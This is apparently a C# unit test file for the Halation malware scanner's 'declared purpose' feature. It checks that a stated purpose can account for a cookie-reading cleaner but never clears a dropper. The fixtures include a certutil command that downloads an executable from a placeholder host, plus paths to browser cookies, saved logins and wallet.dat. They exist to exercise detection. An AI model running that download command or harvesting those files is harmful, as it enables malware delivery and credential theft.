using Halation.Core;
using Halation.Core.Model;
using Halation.Core.Reporting;

namespace Halation.Tests;

/// <summary>
/// Weighing what an application does against what it was said to be for.
/// </summary>
/// <remarks>
/// Reading a browser's cookie database is what credential-stealing malware does and what a
/// cleaning utility does, and a scanner that cannot tell them apart tells the author of a
/// cleaner not to install their own work. These tests hold both directions: a purpose accounts
/// for what it covers, and reaches nothing else.
/// </remarks>
public class DeclaredPurposeTests : IDisposable
{
    private readonly string _scratch = Path.Combine(
        Path.GetTempPath(), $"halation-purpose-{Guid.NewGuid():N}");

    public DeclaredPurposeTests() => Directory.CreateDirectory(_scratch);

    public void Dispose()
    {
        try { Directory.Delete(_scratch, recursive: true); } catch (IOException) { }
        GC.SuppressFinalize(this);
    }

    /// <summary>A cleaner, written the way the real one is.</summary>
    private const string Cleaner = """
        const sharedDbFileSets = {
          chromium: ["History", "Cookies", "Network/Cookies"],
          firefox: ["places.sqlite", "cookies.sqlite"]
        };
        """;

    /// <summary>Something no statement of purpose is allowed to reach.</summary>
    private const string Dropper = """
        const cmd = "certutil -urlcache -f http://example.invalid/p.exe p.exe";
        """;

    private async Task<ScanReport> ScanAsync(string content, DeclaredPurpose? purpose = null)
    {
        File.WriteAllText(Path.Combine(_scratch, "app.js"), content);

        return await new Scanner().ScanAsync(
            _scratch,
            ScanOptions.NoDependencyCheck with { DeclaredPurpose = purpose });
    }

    // ---- Without a purpose, nothing changes ---------------------------------

    /// <summary>
    /// The strict reading stays the default. Nobody's scan gets quieter because this feature
    /// exists.
    /// </summary>
    [Fact]
    public async Task Undeclared_a_cleaner_is_still_told_not_to_install_itself()
    {
        var report = await ScanAsync(Cleaner);

        Assert.Equal(InstallAdvice.AdviseAgainst, report.Verdict.Advice);
        Assert.True(report.Verdict.AdviseAgainstInstall);
        Assert.Contains(report.Findings, f => f.RuleId == "VC-MAL-002");
    }

    // ---- With one, the finding moves rather than vanishing -------------------

    [Fact]
    public async Task Accounted_for_it_stops_advising_against_installation()
    {
        var report = await ScanAsync(
            Cleaner, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        Assert.Equal(InstallAdvice.ConsistentWithStatedPurpose, report.Verdict.Advice);
        Assert.False(report.Verdict.AdviseAgainstInstall);
    }

    /// <summary>
    /// Moved, not deleted. The behaviour is the same behaviour and the report still says so,
    /// which is the difference between explaining a finding and hiding one.
    /// </summary>
    [Fact]
    public async Task It_is_still_reported_and_still_attributed()
    {
        var report = await ScanAsync(
            Cleaner, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        Assert.DoesNotContain(report.Findings, f => f.RuleId == "VC-MAL-002");

        var moved = Assert.Single(report.Capabilities, f => f.RuleId == "VC-MAL-002");

        Assert.Equal(PurposeSource.Reader, moved.ExplainedBy);
        Assert.Equal(Severity.Critical, moved.Severity);
        Assert.NotEmpty(report.Verdict.AccountedFor);
    }

    /// <summary>
    /// The headline must not overclaim once the arithmetic has nothing left to count.
    /// </summary>
    /// <remarks>
    /// A cleaner with an accounted-for cookie read scores a genuine 100/100, because every
    /// finding that counted has been moved. Labelled "no known issues found", that is a
    /// screenshot giving a clean bill of health to an application with six critical behaviours
    /// in it, all of them further down the page than a screenshot reaches.
    /// </remarks>
    [Fact]
    public async Task A_perfect_score_does_not_claim_nothing_was_found()
    {
        var report = await ScanAsync(
            Cleaner, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        Assert.Equal(100, report.Verdict.Score);
        Assert.DoesNotContain("No known issues", report.Verdict.BandLabel, StringComparison.Ordinal);
        Assert.Contains("accounted for", report.Verdict.BandLabel, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("accounted for", report.SummaryLine, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>And the ordinary clean result is untouched by that qualification.</summary>
    [Fact]
    public async Task A_genuinely_clean_result_still_says_so()
    {
        var report = await ScanAsync("const x = 1;");

        Assert.Equal("No known issues found", report.Verdict.BandLabel);
        Assert.DoesNotContain("accounted for", report.SummaryLine, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>And the score stops being dragged down by it.</summary>
    [Fact]
    public async Task The_score_recovers()
    {
        var strict = await ScanAsync(Cleaner);
        var accounted = await ScanAsync(
            Cleaner, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        Assert.True(
            accounted.Verdict.Score > strict.Verdict.Score,
            $"strict {strict.Verdict.Score}, accounted {accounted.Verdict.Score}");

        Assert.NotEqual(ScoreBand.CriticalIssues, accounted.Verdict.Band);
    }

    /// <summary>
    /// A reader handed the exported report has to be able to see what was accounted for. A
    /// screenshot of a quiet result must not be able to hide what bought the quiet.
    /// </summary>
    [Fact]
    public async Task The_export_says_what_was_accounted_for_and_who_said_so()
    {
        var report = await ScanAsync(
            Cleaner, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        var markdown = MarkdownReportWriter.Write(report);

        Assert.Contains("Accounted for", markdown, StringComparison.Ordinal);
        Assert.Contains("You told Halation", markdown, StringComparison.Ordinal);
        Assert.Contains("read your browser cookies", markdown, StringComparison.OrdinalIgnoreCase);
    }

    // ---- And it reaches only what it covers ---------------------------------

    /// <summary>
    /// Accounting for one thing says nothing about another. The obvious way to break this
    /// feature is for a declaration to quieten more than it named.
    /// </summary>
    [Fact]
    public async Task Accounting_for_one_capability_does_not_cover_a_different_one()
    {
        var report = await ScanAsync(
            Cleaner, DeclaredPurpose.FromReader(Capability.CryptocurrencyWallets));

        Assert.Equal(InstallAdvice.AdviseAgainst, report.Verdict.Advice);
        Assert.Contains(report.Findings, f => f.RuleId == "VC-MAL-002");
    }

    /// <summary>
    /// The load-bearing one. Nothing outside a declaration's reach means a declaration cannot
    /// become a way to wave anything through, and VC-MAL-008 is what sits there.
    /// </summary>
    [Theory]
    [InlineData(Capability.BrowserCookies)]
    [InlineData(Capability.DownloadsAndRunsCode)]
    [InlineData(Capability.BrowserCredentials)]
    public async Task No_purpose_reaches_the_absolute_tier(Capability claimed)
    {
        var report = await ScanAsync(Dropper, DeclaredPurpose.FromReader(claimed));

        Assert.Equal(InstallAdvice.AdviseAgainst, report.Verdict.Advice);
        Assert.Contains(report.Findings, f => f.RuleId == "VC-MAL-008");
    }

    /// <summary>Every capability at once still does not reach it.</summary>
    [Fact]
    public async Task Accounting_for_everything_still_does_not_reach_it()
    {
        var report = await ScanAsync(
            Dropper, DeclaredPurpose.FromReader(Enum.GetValues<Capability>()));

        Assert.Equal(InstallAdvice.AdviseAgainst, report.Verdict.Advice);
    }

    // ---- Declaring too much is itself worth saying --------------------------

    /// <summary>
    /// The answer to somebody accounting for everything to get a friendlier number. It cannot
    /// be prevented, so it is reported, in the same report, where anybody reading it sees the
    /// same thing the person who ran the scan saw.
    /// </summary>
    [Fact]
    public async Task A_declaration_that_covers_nearly_everything_is_reported()
    {
        var everything = """
            const a = ["cookies.sqlite"];
            const b = "Google/Chrome/User Data/Default/Login Data";
            const c = "wallet.dat";
            """;

        var report = await ScanAsync(everything, DeclaredPurpose.FromReader(
            Capability.BrowserCookies,
            Capability.BrowserCredentials,
            Capability.CryptocurrencyWallets));

        var finding = Assert.Single(
            report.Findings, f => f.RuleId == Scanner.OverDeclarationRule);

        Assert.Equal(Severity.Medium, finding.Severity);
        Assert.Null(finding.Capability);
    }

    /// <summary>One accounted-for behaviour is an application doing its job, not a pattern.</summary>
    [Fact]
    public async Task Accounting_for_one_thing_is_not_reported_as_over_declaring()
    {
        var report = await ScanAsync(
            Cleaner, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        Assert.DoesNotContain(report.Findings, f => f.RuleId == Scanner.OverDeclarationRule);
    }

    // ---- Answering costs nothing --------------------------------------------

    /// <summary>
    /// Every finding already names its capability, so answering is a re-sort of what is in
    /// hand. Nothing about the artifact is read twice.
    /// </summary>
    [Fact]
    public async Task Reconsidering_reaches_the_same_answer_as_scanning_with_it()
    {
        var strict = await ScanAsync(Cleaner);
        var reconsidered = Scanner.Reconsider(
            strict, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        var scanned = await ScanAsync(
            Cleaner, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        Assert.Equal(scanned.Verdict.Advice, reconsidered.Verdict.Advice);
        Assert.Equal(scanned.Verdict.Score, reconsidered.Verdict.Score);
        Assert.Equal(scanned.Findings.Count, reconsidered.Findings.Count);
        Assert.Equal(scanned.Capabilities.Count, reconsidered.Capabilities.Count);
    }

    /// <summary>
    /// And taking it back has to work too, or a reader who mis-answered is stuck with a
    /// friendlier report than the evidence supports.
    /// </summary>
    [Fact]
    public async Task Withdrawing_a_purpose_restores_the_strict_reading()
    {
        var accounted = await ScanAsync(
            Cleaner, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        var withdrawn = Scanner.Reconsider(accounted, purpose: null);

        Assert.Equal(InstallAdvice.AdviseAgainst, withdrawn.Verdict.Advice);
        Assert.Contains(withdrawn.Findings, f => f.RuleId == "VC-MAL-002");
        Assert.DoesNotContain(withdrawn.Findings, f => f.ExplainedBy is not null);
    }

    /// <summary>Only the questions worth asking, so a clean scan asks nothing at all.</summary>
    [Fact]
    public async Task Only_what_actually_fired_is_worth_asking_about()
    {
        Assert.Equal(
            [Capability.BrowserCookies],
            Scanner.QuestionsFor(await ScanAsync(Cleaner)));

        Assert.Empty(Scanner.QuestionsFor(await ScanAsync("const x = 1;")));
    }

    // ---- Whether asking is worth the reader's time at all -------------------

    /// <summary>
    /// Nothing worth asking about is not the same as nothing wrong. When a dropper fired, no
    /// answer to any question can change the advice, and putting one up would imply otherwise.
    /// </summary>
    [Fact]
    public async Task A_dropper_leaves_nothing_worth_asking()
    {
        var report = await ScanAsync(Dropper);

        Assert.True(report.HasUnanswerableBlocking);
    }

    /// <summary>The case that is worth asking: everything blocking could be accounted for.</summary>
    [Fact]
    public async Task A_cleaner_leaves_a_question_worth_asking()
    {
        var report = await ScanAsync(Cleaner);

        Assert.False(report.HasUnanswerableBlocking);
        Assert.NotEmpty(Scanner.QuestionsFor(report));
    }

    /// <summary>
    /// And one of each settles it. A question alongside something no answer can rescue would
    /// offer the reader an influence over the verdict that they do not have.
    /// </summary>
    [Fact]
    public async Task A_dropper_alongside_an_answerable_one_settles_the_verdict()
    {
        var report = await ScanAsync(Cleaner + "\n" + Dropper);

        Assert.True(report.HasUnanswerableBlocking);

        // And accounting for the answerable half still does not move the advice.
        var accounted = Scanner.Reconsider(
            report, DeclaredPurpose.FromReader(Capability.BrowserCookies));

        Assert.Equal(InstallAdvice.AdviseAgainst, accounted.Verdict.Advice);
        Assert.True(accounted.HasUnanswerableBlocking);
    }
}
